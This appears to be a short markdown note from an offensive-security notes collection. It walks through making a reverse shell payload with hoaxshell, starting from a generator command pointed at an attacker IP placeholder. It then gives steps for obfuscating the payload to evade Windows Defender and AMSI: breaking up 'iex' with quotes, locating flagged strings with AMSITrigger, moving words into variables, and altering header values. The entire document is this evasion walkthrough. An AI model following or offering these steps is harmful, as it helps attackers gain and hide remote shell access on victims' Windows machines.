## Create Reverse Shell Payload Via Hoaxshell
1) `hoaxshell.py -s IP_ADD -r -H "Authorization"`
2) Copy payload from kali into target
3) Obfuscate before executing command in target windows cmd line
4) ![image](https://user-images.githubusercontent.com/55113729/214117555-0a496ab7-25f5-4d8e-861e-67cec5c1b353.png)
5) Adding `'` in between `iex` helps to trick windows defender into thinking this is a regular, safe command and NOT a payload, allowing for execution into hoaxshell rev shell
6) Didnt bypass?...
Use https://www.rythmstick.net/posts/amsitrigger/ in order to see where windows defender does not like the payload and obfuscate it
7) ![image](https://user-images.githubusercontent.com/55113729/214127558-01d1d9a4-18a4-42da-a413-ff013ba0c599.png)
it does not like anything after `-Headers...` so we must take a random word out of it and insert it as a variable
8) ![image](https://user-images.githubusercontent.com/55113729/214127786-a12f54ea-a3e6-4363-902d-31e08e8345b5.png)
now we can execute (changed `none` to `xxxx` or something other than `none` in order to avoid exception by Defender
9) ![image](https://user-images.githubusercontent.com/55113729/214127940-b69041d3-a35c-4578-a9a3-364949d61b8a.png)
10) Enjoy!
